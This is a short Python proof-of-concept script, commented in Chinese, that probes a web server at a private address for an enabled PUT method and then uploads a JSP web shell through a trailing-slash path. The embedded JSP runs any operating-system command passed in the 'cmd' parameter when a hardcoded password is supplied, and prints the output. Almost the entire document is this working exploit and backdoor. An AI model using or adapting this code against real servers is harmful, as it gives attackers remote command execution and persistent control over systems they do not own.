#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
这是python3版本的poc,
需要安装第三方库requests
"""


import requests

body = '''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
<%! public static String excuteCmd(String c) 
{StringBuilder line = new StringBuilder();
try 
{Process pro = Runtime.getRuntime().exec(c);
BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));
String temp = null;
while ((temp = buf.readLine()) != null) 
{line.append(temp+"\\n");}buf.close();} 
catch (Exception e) 
{line.append(e.getMessage());}return line.toString();}%>
<%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'''

url = "http://192.168.174.132:8080"

try:
    resp = requests.options(url + "/fuzzzz")

    if "Allow" in resp.headers and "PUT" in resp.headers['Allow']:
        resp = requests.put(url + "/poc.jsp/", data=body)
        if resp.status_code == 201:
            print("success")
        elif resp.status_code == 204:
            print("file exists")
        else:
            print("error")
        resp.close()
    else:
        print("Server is not vulnerable")
except Exception as e:
    print(e)
